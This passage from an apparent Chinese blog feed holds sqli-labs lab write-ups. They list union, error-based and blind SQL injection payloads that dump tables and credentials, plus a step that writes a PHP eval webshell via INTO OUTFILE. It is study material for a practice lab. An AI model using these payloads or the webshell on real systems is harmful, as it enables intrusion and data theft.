alt="18"></p><p>uname用check_input()函数进行了处理，只截取15个字符；</p><p>get_magic_quotes_gpc()用于判断解析用户提示的数据，特别是post、get、cookie过来的数据增加转义字符“\”。</p><p>stripslashes()删除由 addslashes() 函数添加的反斜杠</p><p>ctype_digit()判断是不是数字，是数字就返回true，否则返回false</p><p>mysql_real_escape_string()转义 SQL 语句中使用的字符串中的特殊字符。</p><p>intval()   整型转换一系列过滤过于麻烦，故从password注入。</p><h4 id="1-试探-v3"><a class="header-anchor" href="#1-试探-v3">🍭</a>1.试探</h4><p><img src="/2020/11/22/sqli-labs%E4%B8%89/19.jpg" alt="19"></p><p>确定为单引号注入。</p><h4 id="2-爆库名-v3"><a class="header-anchor" href="#2-爆库名-v3">🍭</a>2.爆库名</h4><p>之前报错试过updatexml，这关试看看floor()和extractvalue()。</p><p>floor()：比较麻烦</p><p><img src="/2020/11/22/sqli-labs%E4%B8%89/20.jpg" alt="20"></p><p>extractvalue()：与updatexml相似</p><p><img src="/2020/11/22/sqli-labs%E4%B8%89/22.jpg" alt="22"></p><p>其余步骤不再赘述。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>sqli-labs（二）</title>
    <link href="/2020/11/09/sqli-labs/"/>
    <url>/2020/11/09/sqli-labs/</url>
    
    <content type="html"><![CDATA[<h1>Sqli-labs–2</h1><ul><li><a href="#sqli-labs--2">Sqli-labs–2</a><ul><li><a href="#%E6%B3%95%E4%B8%80%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5">法一:联合注入</a><ul><li><a href="#%E7%9B%B2%E6%B3%A8%E7%8C%9C%E8%A7%A3less-5">盲注猜解Less-5</a><ul><li><a href="#1%E8%AF%95%E6%8E%A2">1.试探:</a></li><li><a href="#2%E7%8C%9C%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D%E9%95%BF%E5%BA%A6">2.<strong>猜数据库名长度</strong>:</a></li><li><a href="#3%E7%8C%9C%E5%BA%93%E5%90%8D">3.<strong>猜库名：</strong></a></li><li><a href="#4%E7%88%86%E8%A1%A8"><strong>4.爆表：</strong></a></li><li><a href="#5%E7%88%86%E5%88%97"><strong>5.爆列：</strong></a></li><li><a href="#6%E7%88%86%E5%80%BC"><strong>6.爆值：</strong></a></li></ul></li></ul></li><li><a href="#%E6%B3%95%E4%BA%8C%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5">法二：报错注入</a><ul><li><a href="#less-6">Less-6</a><ul><li><a href="#1%E8%AF%95%E6%8E%A2-1">1.试探</a></li><li><a href="#2%E7%88%86%E5%BA%93%E5%90%8D">2.爆库名</a></li><li><a href="#3%E7%88%86%E8%A1%A8">3.爆表</a></li><li><a href="#4%E7%88%86%E5%88%97">4.爆列</a></li><li><a href="#5%E7%88%86%E5%80%BC">5.爆值</a></li></ul></li><li><a href="#less-7">Less-7</a><ul><li><a href="#1%E8%AF%95%E6%8E%A2-2">1.试探</a></li><li><a href="#2%E8%8E%B7%E5%8F%96%E6%96%87%E4%BB%B6%E8%B7%AF%E5%BE%84">2.获取文件路径</a><ul><li><a href="#%E6%B3%95%E4%B8%80">法一：</a></li><li><a href="#%E6%B3%95%E4%BA%8C">法二：</a></li></ul></li></ul></li></ul></li><li><a href="#%E6%B3%95%E4%B8%89%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8">法三：时间盲注</a></li><li><a href="#less-8">Less-8</a><ul><li><a href="#1%E8%AF%95%E6%8E%A2-3">1.试探</a></li><li><a href="#2%E7%88%86%E5%BA%93%E9%95%BF">2.爆库长</a></li><li><a href="#3%E7%88%86%E5%BA%93">3.爆库</a></li><li><a href="#4%E7%88%86%E8%A1%A8-1">4.爆表</a></li><li><a href="#5%E7%88%86%E5%88%97-1">5.爆列</a></li><li><a href="#6%E7%88%86%E5%80%BC-1">6.爆值</a></li><li><a href="#less-9">Less-9</a></li><li><a href="#less-10">Less-10</a></li></ul></li></ul></li></ul><h2 id="法一-联合注入"><a class="header-anchor" href="#法一-联合注入">🍭</a>法一:联合注入</h2><h3 id="盲注猜解Less-5"><a class="header-anchor" href="#盲注猜解Less-5">🍭</a>盲注猜解Less-5</h3><h4 id="1-试探"><a class="header-anchor" href="#1-试探">🍭</a>1.试探:</h4><p>插入<code>?id=1'</code>报错，但未报错时页面并没有任何信息的回显；执行SQL语句后，若语句查询到匹配的数据会显示‘You are in……如果SQL语句没有查询到匹配的数据就不回显；如果语句有错误就显示错误的信息；故判断其为盲注。前四节都是通过闭合sql语句注入，这里只能通过数据库报错来获取想要的数据，原理：将group by与一个聚合函数一起使用，如count(*)，可以将想要查询的内容作为错误信息返回。</p><h4 id="2-猜数据库名长度"><a class="header-anchor" href="#2-猜数据库名长度">🍭</a>2.<strong>猜数据库名长度</strong>:</h4><p><code>’ and length (database())=8--+</code>试到8时回显正常</p><p><img src="/2020/11/09/sqli-labs/1.jpg" alt="1"></p><h4 id="3-猜库名："><a class="header-anchor" href="#3-猜库名：">🍭</a>3.<strong>猜库名：</strong></h4><p><code>' and left((select database()),1)='s'--+</code>回显正常，再探寻第二个字母<code>' and left((select database()),2)='sy'--+</code>报错：</p><p><img src="/2020/11/09/sqli-labs/3.jpg" alt="3"></p><p>将y换成e后正常，依次推出八位数（经漫长的试探…）得出库名security。security的十六进制=<strong>0x7365637572697479</strong></p><h4 id="4-爆表："><a class="header-anchor" href="#4-爆表：">🍭</a><strong>4.爆表：</strong></h4><p><code>union Select 1,count(*),concat(0x3a,0x3a,( select table_name from information_schema.tables where table_schema=0x7365637572697479 limit 0,1),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a--+</code></p><p><img src="/2020/11/09/sqli-labs/4.jpg" alt="4"></p><h4 id="5-爆列："><a class="header-anchor" href="#5-爆列：">🍭</a><strong>5.爆列：</strong></h4><p><code> union Select 1,count(*),concat(0x3a,0x3a,( select column_name from information_schema.columns where table_schema=0x7365637572697479 and table_name='users' limit 0,1),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a--+</code><img src="/2020/11/09/sqli-labs/5.jpg" alt="5"></p><h4 id="6-爆值："><a class="header-anchor" href="#6-爆值：">🍭</a><strong>6.爆值：</strong></h4><p><code>union Select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a--+</code><img src="/2020/11/09/sqli-labs/6.jpg" alt="6"></p><h2 id="法二：报错注入"><a class="header-anchor" href="#法二：报错注入">🍭</a>法二：报错注入</h2><h3 id="Less-6"><a class="header-anchor" href="#Less-6">🍭</a>Less-6</h3><h4 id="1-试探-v2"><a class="header-anchor" href="#1-试探-v2">🍭</a>1.试探</h4><p>用<code>?id=1&quot;</code>时报错，加上<code>--+</code>时回显正常。</p><h4 id="2-爆库名"><a class="header-anchor" href="#2-爆库名">🍭</a>2.爆库名</h4><p><code>and updatexml(1,concat(0x7e,database(),0x7e),1)%23 </code>(0x7e是十六进制的“~”)</p><p><img src="/2020/11/09/sqli-labs/10.jpg" alt="10"></p><h4 id="3-爆表"><a class="header-anchor" href="#3-爆表">🍭</a>3.爆表</h4><p><code>and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)%23</code></p><p><img src="/2020/11/09/sqli-labs/11.jpg" alt="11"></p><h4 id="4-爆列"><a class="header-anchor" href="#4-爆列">🍭</a>4.爆列</h4><p><code>and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),0x7e),1)%23</code></p><p><img src="/2020/11/09/sqli-labs/12.jpg" alt="12"></p><h4 id="5-爆值"><a class="header-anchor" href="#5-爆值">🍭</a>5.爆值</h4><p><code>and updatexml(1,concat(0x7e,(select username from users limit 0,1),0x7e),1)%23</code>因updatexml()函数最多只能爆32个字符故用<code>limit 0,1</code>一一查询</p><p><img src="/2020/11/09/sqli-labs/13.jpg" alt="13"></p><p><img src="/2020/11/09/sqli-labs/18.jpg" alt="18"></p><p>…还有很多，不一一列举。</p><h3 id="Less-7"><a class="header-anchor" href="#Less-7">🍭</a>Less-7</h3><h4 id="1-试探-v3"><a class="header-anchor" href="#1-试探-v3">🍭</a>1.试探</h4><p>输入<code>id=1'</code>报错，用–+注释掉后仍报错；尝试加一个括号，还是报错，再加一个，回显正常。<img src="/2020/11/09/sqli-labs/8.jpg" alt="8"></p><h4 id="2-获取文件路径"><a class="header-anchor" href="#2-获取文件路径">🍭</a>2.获取文件路径</h4><p>科普小知识：</p><p>@@datadir 读取数据库路径;@@basedir MYSQL 获取安装路径</p><p>一句话木马:本关用到php版本的一句话木马：<code>&lt;?php @eval($_POST[“cmd”]);?&gt; </code></p><p>load_file(): 读取本地文件; into outfile :写文件;</p><p>用命令<code>union select 1,@@basedir,@@datadir --+</code>在低关卡查询文件的相对路径<img src="/2020/11/09/sqli-labs/9.jpg" alt="9"></p><h6 id="法一："><a class="header-anchor" href="#法一：">🍭</a>法一：</h6><p>根据以上查询的文件地址使用<code>?id=1')) union select 1,2,'&lt;?php @eval($_POST[&quot;cmd&quot;]);?&gt;' into outfile &quot;D:\\phpstudy_pro\WWW\\sql\\hhh.php&quot;--+</code>语句新建php文件便于后续闯关。(<strong>路径需要用<code>\\</code>这点一定要记住</strong>)</p><p>蚁剑:</p><p><img src="/2020/11/09/sqli-labs/26.jpg" alt="26"></p><p>注：密码为木马语句post框里的内容。</p><p>打开：</p><p><img src="/2020/11/09/sqli-labs/27.jpg" alt="27"></p><p>也可以用菜刀：</p><p><img src="/2020/11/09/sqli-labs/28.jpg" alt="28"></p><p>路径里的文件名一定要对，我刚开始下了菜刀，然后看了一个教程里面对文件命名为test.php;我自己命名为hhh.php，然后再编辑数据的时候输入了test.php…为此我还觉得是菜刀出了问题，然后下了蚁剑，还是不行，最后发现我的文件名错了！！!因为这个憨憨问题，我从13号晚上开始困惑了一天…</p><h6 id="法二："><a class="header-anchor" href="#法二：">🍭</a>法二：</h6><p>使用<code>?id=1')) union select 1,2,3 into outfile &quot;D:\\phpstudy_pro\\Extensions\\MySQL5.7.26\\data\\test.php&quot;--+</code></p><p>可以在目录下发现text.php文件</p><p><img src="/2020/11/09/sqli-labs/19.jpg" alt="19"></p><p>爆数据库名</p><p><code>union select 1,user(),database() into outfile D:\\phpstudy_pro\\Extensions\\MySQL5.7.26\\data\\a.php&quot;</code><img src="/2020/11/09/sqli-labs/21.jpg" alt="21"></p><p>爆表</p><p><code>union select 1,2,table_name from information_schema.tables where table_schema='security' into outfile</code></p><p><img src="/2020/11/09/sqli-labs/22.jpg" alt="22"></p><p>爆字段</p><p><code>union select 1,2,column_name from information_schema.columns where table_schema='security' and table_name='users' into outfile</code><img src="/2020/11/09/sqli-labs/23.jpg" alt="23"></p><p>爆值</p><p><code>union select * from users into outfile</code><img src="/2020/11/09/sqli-labs/24.jpg" alt="24"></p><h2 id="法三：时间盲注"><a class="header-anchor" href="#法三：时间盲注">🍭</a>法三：时间盲注</h2><h2 id="Less-8"><a class="header-anchor" href="#Less-8">🍭</a>Less-8</h2><h4 id="1-试探-v4"><a class="header-anchor" href="#1-试探-v4">🍭</a>1.试探</h4><p><code>id=1'</code>报错，用<code>--+</code>注释后回显正常。（其实标题就看得出来…）</p><h4 id="2-爆库长"><a class="header-anchor" href="#2-爆库长">🍭</a>2.爆库长</h4><p><code>?id=1' and if(length(database())=8,sleep(5),1)--+</code><img src="/2020/11/09/sqli-labs/25.jpg" alt="25"></p><p>图中圈圈在值为8的时候延迟了，故值为8</p><h4 id="3-爆库"><a class="header-anchor" href="#3-爆库">🍭</a>3.爆库</h4><p><code>?id=1' and if(left(database(),1)='s',sleep(5),1)--+</code></p><p>与上述一样故值为s;接着增加left(database(),字符长度)中的字符长度，等号右边依次爆破下一个字符，正确匹配时会延迟，（经过漫长试探）最终爆破得到left(database(),8)=‘security’。</p><h4 id="4-爆表"><a class="header-anchor" href="#4-爆表">🍭</a>4.爆表</h4><p><code>?id=1' and if(left((select table_name from information_schema.tables where table_schema=database() limit 3,1),5)='users' ,sleep(5),1)--+</code></p><p>得出表名为users。</p><h4 id="5-爆列"><a class="header-anchor" href="#5-爆列">🍭</a>5.爆列</h4><p><code>?id=1' and if(left((select column_name from information_schema.columns where table_name='users' limit 5,1),8)='password' ,sleep(5),1) --+</code></p><p>在limit5,1的时候查到了password，在limit4,1时查到了username.</p><h4 id="6-爆值"><a class="header-anchor" href="#6-爆值">🍭</a>6.爆值</h4><p><code>?id=1' and if(left((select password from users order by id limit 0,1),4)='dumb' ,sleep(5),1)--+</code></p><p><code>?id=1' and if(left((select username from users order by id limit 0,1),4)='dumb' ,sleep(5),1)--+</code></p><p>所以第一个用户的名字dumb，密码dumb；在经过漫长的尝试依次查出其余的值。</p><h3 id="Less-9"><a class="header-anchor" href="#Less-9">🍭</a>Less-9</h3><p>输入一系列符号，发现一直you are in …;判断为时间盲注。输入<code>?id=1' and sleep(5) --+</code>所以为单引号盲注。接下去和第八关的时间盲注步骤相似。</p><h3 id="Less-10"><a class="header-anchor" href="#Less-10">🍭</a>Less-10</h3><p>试探为时间盲注，<code>?id=1&quot; and sleep(5) --+</code>延迟，故为双引号盲注，接下去与第八关相似。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>sqli-labs（一）</title>
    <link href="/2020/11/08/sqli/"/>
    <url>/2020/11/08/sqli/</url>
    
    <content type="html"><![CDATA[<h1>Sqli-labs</h1><p>本篇文章运用的注入语句已在sqli基础中说明，故运用时不再解释原因。</p><h2 id="类型判断"><a class="header-anchor" href="#类型判断">🍭</a>类型判断</h2><ol><li><code>?id=1 and 1=2 --+</code>若返回结果正常，说明不是数字类型；</li><li><code>?id=1' --+</code> 显示不正常,<code>?id=1') --+ </code>显示正常时，该类型为字符注入，且以(‘’)的方式闭合字符串，还有(“”)类似。</li></ol><h2 id="Less-1"><a class="header-anchor" href="#Less-1">🍭</a>Less-1</h2><h4 id="法一：UNION联合查询注入"><a class="header-anchor" href="#法一：UNION联合查询注入">🍭</a>法一：UNION联合查询注入</h4><ol><li>用and 1=2测试 ，页面回显正常，所以该地方不是数值查询。</li><li>尝试在id后面加上’，页面回显不正常，可能存在SQL字符注入。</li><li>用–+将sql后面的语句注视掉后，页面回显正常，则证明这个地方是单引号字符型注入</li><li>使用order by 语句判断有几列数据；order by 3页面回显正常，order by 4页面回显不正常，说明此表一个有3列。</li><li>将id=1改为一个数据库不存在的id值，如-1（当用id=1的时候执行的结果只有一条记录，因为在 index.php 中并没有循环取出数据，<strong>故让第一行查询的结果是空集，union右边的查询结果自然就成为了第一行</strong>，打印在网页上了，id一般是数字，从1开始自增的，可把id值设为非正数（负数或0），浮点数，字符型或字符串）使用union select 1,2,3联合查询语句查看页面是否有显示位。<img src="/2020/11/08/sqli/11.jpg" alt="11"></li></ol><p>输出结果说明页面有2个显示位。</p><p>6.用sql查询语句依次爆破出数据库内的数据库名，表名，列名，字段信息。</p><p><strong>查询数据库名:</strong></p><p><code>union select 1,(select group_concat(schema_name) from information_schema.schemata),3 --+</code><img src="/2020/11/08/sqli/12.jpg" alt="12"></p><p><strong>查询所有表名:</strong></p><p><code>union select 1,(select group_concat(schema_name) from information_schema.schemata),(select group_concat(table_name) from information_schema.tables where table_schema='security')--+</code><img src="/2020/11/08/sqli/13.jpg" alt="13"></p><p><strong>查列名：</strong></p><p><code>union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users' --+</code></p><p><img src="/2020/11/08/sqli/14.jpg" alt="14"></p><p><strong>查询用户名，密码:</strong></p><p><code>union select 1,group_concat(username,0x3a,password),3 from users --+</code></p><p><img src="/2020/11/08/sqli/15.jpg" alt="15"></p><h2 id="Less-3"><a class="header-anchor" href="#Less-3">🍭</a>Less-3</h2><h4 id="法二：报错型注入"><a class="header-anchor" href="#法二：报错型注入">🍭</a>法二：报错型注入</h4><p>因less1-4的步骤类似，故报错型注入以less3为例。</p><p>输入单引号报错，输入 --+后仍报错，故不是简单的单引号报错；输入<code>?id=1') --+ </code>回显示正常，则证明less-3属于以(‘’)的方式闭合字符串。</p><p><strong>爆表</strong></p><p><code>and 1=extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))) --+</code></p><p><img src="/2020/11/08/sqli/16.jpg" alt="16"></p><p><strong>爆列</strong></p><p><code>and%201=extractvalue(1,concat(0x7e,(select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=%27users%27)))%20--+</code><img src="/2020/11/08/sqli/17.jpg" alt="17"></p><p><strong>爆值</strong><br><code> and 1=extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,password) from users))) --+</code></p><p><img src="/2020/11/08/sqli/18.jpg" alt="18"></p><p><code>and 1=extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,password) from users where username not in ('Dumb','I-kill-you'))))--+</code></p><p><img src="/2020/11/08/sqli/19.jpg" alt="19"></p><h2 id="Less-2"><a class="header-anchor" href="#Less-2">🍭</a>Less-2</h2><p><code>?id=1 and 1=2 --+</code>回显不正常，判断为数字型注入，把第一题中id=1后面的单引号去掉，其它保持不变。</p><h2 id="Less-4"><a class="header-anchor" href="#Less-4">🍭</a>Less-4</h2><p>输入单引号不报错，<code>?id=1')</code>也不报错<code>?id=1&quot;)</code>报错，加上<code>--+</code>后回显正常，故为与(“”)的方式闭合字符串类型；方法类似。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>SQL基础</title>
    <link href="/2020/11/08/SQL/"/>
    <url>/2020/11/08/SQL/</url>
    
    <content type="html"><![CDATA[<h1>SQL</h1><p>sql注入就是一种通过操作输入来修改后台操作语句达到执行恶意sql语句来进行攻击的技术。</p><ul><li><a href="#sql">SQL</a><ul><li><a href="#%E5%88%86%E7%B1%BB">分类</a><ul><li><a href="#%E5%8F%98%E9%87%8F%E7%B1%BB%E5%9E%8B">变量类型</a></li><li><a href="#http%E6%8F%90%E4%BA%A4%E6%96%B9%E5%BC%8F">HTTP提交方式</a></li><li><a href="#%E6%B3%A8%E5%85%A5%E6%96%B9%E5%BC%8F">注入方式</a></li><li><a href="#%E7%BC%96%E7%A0%81%E9%97%AE%E9%A2%98">编码问题</a></li></ul></li><li><a href="#%E4%BF%A1%E6%81%AF%E6%95%B0%E6%8D%AE%E5%BA%93mysql-50%E4%BB%A5%E4%B8%8A">信息数据库（MySql 5.0以上）</a><ul><li><a href="#information_schema"><strong>information_schema</strong></a></li><li><a href="#schemata%E6%89%80%E6%9C%89%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF"><strong>SCHEMATA</strong>(所有数据库的基本信息)</a></li><li><a href="#tables%E5%AD%98%E5%82%A8%E8%A1%A8%E4%BF%A1%E6%81%AF"><strong>TABLES</strong>(存储表信息)</a></li><li><a href="#columns%E5%82%A8%E5%AD%98%E5%88%97%E4%BF%A1%E6%81%AF"><strong>COLUMNS</strong>(储存列信息)</a></li><li><a href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BF%9E%E6%8E%A5%E5%87%BD%E6%95%B0">字符串连接函数</a></li></ul></li><li><a href="#%E5%9F%BA%E6%9C%AC%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B">基本手工注入流程</a><ul><li><a href="#%E8%8E%B7%E5%8F%96%E5%AD%97%E6%AE%B5%E6%95%B0">获取字段数</a></li><li><a href="#%E8%8E%B7%E5%8F%96%E7%B3%BB%E7%BB%9F%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D">获取系统数据库名</a></li><li><a href="#%E8%8E%B7%E5%8F%96%E5%BD%93%E5%89%8D%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D">获取当前数据库名</a></li><li><a href="#%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%AD%E7%9A%84%E8%A1%A8">获取数据库中的表</a></li><li><a href="#%E8%8E%B7%E5%8F%96%E8%A1%A8%E4%B8%AD%E7%9A%84%E5%AD%97%E6%AE%B5">获取表中的字段</a></li><li><a href="#%E8%8E%B7%E5%8F%96%E5%90%84%E4%B8%AA%E5%AD%97%E6%AE%B5%E7%9A%84%E5%80%BC">获取各个字段的值</a></li></ul></li><li><a href="#%E5%B8%B8%E7%94%A8%E6%B3%A8%E5%85%A5%E6%96%B9%E5%BC%8F">常用注入方式</a><ul><li><a href="#union%E6%B3%A8%E5%85%A5">union注入</a></li><li><a href="#%E5%B8%83%E5%B0%94%E6%B3%A8%E5%85%A5%E6%9E%84%E9%80%A0%E9%80%BB%E8%BE%91%E5%88%A4%E6%96%AD">布尔注入(构造逻辑判断)</a><ul><li><a href="#regexp%E6%AD%A3%E5%88%99%E6%B3%A8%E5%85%A5">regexp正则注入</a></li><li><a href="#like%E5%8C%B9%E9%85%8D%E6%B3%A8%E5%85%A5">like匹配注入</a></li></ul></li><li><a href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5">报错注入</a><ul><li><a href="#floor%E5%92%8Crand">floor()和rand()</a></li><li><a href="#extractvalue">extractvalue()</a></li><li><a href="#updatexml">updatexml()</a></li><li><a href="#geometrycollection">geometrycollection()</a></li><li><a href="#multipoint">multipoint()</a></li><li><a href="#polygon">polygon()</a></li><li><a href="#multipolygon">multipolygon()</a></li><li><a href="#linestring">linestring()</a></li><li><a href="#multilinestring">multilinestring()</a></li><li><a href="#exp">exp()</a></li></ul></li><li><a href="#%E6%97%B6%E9%97%B4%E6%B3%A8%E5%85%A5">时间注入</a></li><li><a href="#%E5%A0%86%E5%8F%A0%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5">堆叠查询注入</a></li><li><a href="#%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5">二次注入</a></li><li><a href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5">宽字节注入</a></li></ul></li></ul></li></ul><h2 id="分类"><a class="header-anchor" href="#分类">🍭</a>分类</h2><h4 id="变量类型"><a class="header-anchor" href="#变量类型">🍭</a>变量类型</h4><ul><li>数字型</li><li>字符型</li></ul><h4 id="HTTP提交方式"><a class="header-anchor" href="#HTTP提交方式">🍭</a>HTTP提交方式</h4><ul><li>GET注入</li><li>POST注入</li><li>Cookie注入</li></ul><h4 id="注入方式"><a class="header-anchor" href="#注入方式">🍭</a>注入方式</h4><ul><li>报错注入</li><li>盲注<ul><li>布尔盲注</li><li>时间盲注</li></ul></li><li>union注入</li></ul><h4 id="编码问题"><a class="header-anchor" href="#编码问题">🍭</a>编码问题</h4><ul><li>宽字节注入</li></ul><h2 id="信息数据库（MySql-5-0以上）"><a class="header-anchor" href="#信息数据库（MySql-5-0以上）">🍭</a>信息数据库（MySql 5.0以上）</h2><h4 id="information-schema"><a class="header-anchor" href="#information-schema">🍭</a><strong>information_schema</strong></h4><p>系统数据库，记录当前数据库的数据库，表，列，用户权限信息。</p><h4 id="SCHEMATA-所有数据库的基本信息"><a class="header-anchor" href="#SCHEMATA-所有数据库的基本信息">🍭</a><strong>SCHEMATA</strong>(所有数据库的基本信息)</h4><pre><code class="hljs crystal">查询数据库：<span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">select</span> 1,2,<span class="hljs-title">group_concat</span>(<span class="hljs-title">schema_name</span>) <span class="hljs-title">from</span> <span class="hljs-title">information_schema</span>.<span class="hljs-title">schemata</span> </span></code></pre><h4 id="TABLES-存储表信息"><a class="header-anchor" href="#TABLES-存储表信息">🍭</a><strong>TABLES</strong>(存储表信息)</h4><pre><code class="hljs crystal">查询表： <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">select</span> 1,2,<span class="hljs-title">group_concat</span>(<span class="hljs-title">table_name</span>) <span class="hljs-title">from</span></span>information_schema.tables where table_schema=<span class="hljs-string">&#x27;表名&#x27;</span></code></pre><h4 id="COLUMNS-储存列信息"><a class="header-anchor" href="#COLUMNS-储存列信息">🍭</a><strong>COLUMNS</strong>(储存列信息)</h4><pre><code class="hljs pgsql">查询列：<span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(<span class="hljs-built_in">column_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;表名&#x27;</span></code></pre><h4 id="字符串连接函数"><a class="header-anchor" href="#字符串连接函数">🍭</a>字符串连接函数</h4><p>concat(str1,str2,…)——没有分隔符地连接字符串</p><p>concata_ws(separator,str1,str2,…)——含有分隔符地连接字符串</p><p>group_concat(str1,str2,…)——连接一个组的所有字符串，并以逗号分隔每一条数据</p><h2 id="基本手工注入流程"><a class="header-anchor" href="#基本手工注入流程">🍭</a>基本手工注入流程</h2><h4 id="获取字段数"><a class="header-anchor" href="#获取字段数">🍭</a>获取字段数</h4><pre><code class="hljs crmsh"><span class="hljs-keyword">order</span> <span class="hljs-title">by</span> n</code></pre><h4 id="获取系统数据库名"><a class="header-anchor" href="#获取系统数据库名">🍭</a>获取系统数据库名</h4><pre><code class="hljs angelscript">select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,schema_name <span class="hljs-keyword">from</span> information_schema.schemata</code></pre><h4 id="获取当前数据库名"><a class="header-anchor" href="#获取当前数据库名">🍭</a>获取当前数据库名</h4><pre><code class="hljs angelscript">select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,database()</code></pre><h4 id="获取数据库中的表"><a class="header-anchor" href="#获取数据库中的表">🍭</a>获取数据库中的表</h4><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>()</code></pre><p>or</p><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-built_in">table_name</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>() <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span></code></pre><p>但法二需一一查询表名。</p><h4 id="获取表中的字段"><a class="header-anchor" href="#获取表中的字段">🍭</a>获取表中的字段</h4><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(<span class="hljs-built_in">column_name</span>) <span class="hljs-keyword">from</span> information_shema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>() <span class="hljs-keyword">and</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;表名&#x27;</span></code></pre><h4 id="获取各个字段的值"><a class="header-anchor" href="#获取各个字段的值">🍭</a>获取各个字段的值</h4><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">group_concat</span>(username,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span>//假设已经获取到表名为<span class="hljs-keyword">user</span>，且字段为username和<span class="hljs-keyword">password</span></code></pre><h2 id="常用注入方式"><a class="header-anchor" href="#常用注入方式">🍭</a>常用注入方式</h2><h3 id="union注入"><a class="header-anchor" href="#union注入">🍭</a>union注入</h3><p>union的作用是将两个sql语句进行联合。当注入参数的数据在数据库中不存在时，两个sql语句进行联合操作时，前一个语句选择的内容为空时，后面语句的查询内容就显示出来。如:</p><pre><code class="hljs crystal">id =-<span class="hljs-number">1</span> <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">select</span> 1,2,3 </span></code></pre><h3 id="布尔注入-构造逻辑判断"><a class="header-anchor" href="#布尔注入-构造逻辑判断">🍭</a>布尔注入(构造逻辑判断)</h3><p>boolean 根据注入信息返回true or fales,无任何报错</p><p><strong>相关函数</strong></p><p><strong>length(str)</strong> ：返回字符串str的长度</p><p><strong>substr(str, pos, len)</strong> ：将str从pos位置开始截取len长度的字符进行返回。注意这里的pos位置是从1开始的，不是数组的0开始</p><p><strong>mid(str,pos,len)</strong> ：跟substr一样，截取字符串</p><p><strong>ascii(str)</strong> ：返回字符串str的最左面字符的ASCII代码值</p><p><strong>ord(str)</strong> ：将字符或布尔类型转成ascll码</p><pre><code class="hljs pgsql"><span class="hljs-string">&#x27; and length (database())=x(某个值，用大于或者小于某个值也可以)--+//猜数据库名长度：(猜对时页面才会显示正常)</span><span class="hljs-string"></span><span class="hljs-string">&#x27;</span> <span class="hljs-keyword">and</span> length((<span class="hljs-keyword">select</span> <span class="hljs-built_in">schema_name</span> <span class="hljs-keyword">from</span> information_schema.schemata <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>))=<span class="hljs-number">18</span> <span class="hljs-comment">--+ //查询所有数据库的长度</span><span class="hljs-string">&#x27; and left(database(),1)=&#x27;</span>s<span class="hljs-string">&#x27;--+ //猜数据库的名字 </span><span class="hljs-string"></span><span class="hljs-string">&#x27;</span> <span class="hljs-keyword">and</span> ascii(substr((<span class="hljs-keyword">select</span> <span class="hljs-built_in">table_name</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>() <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span 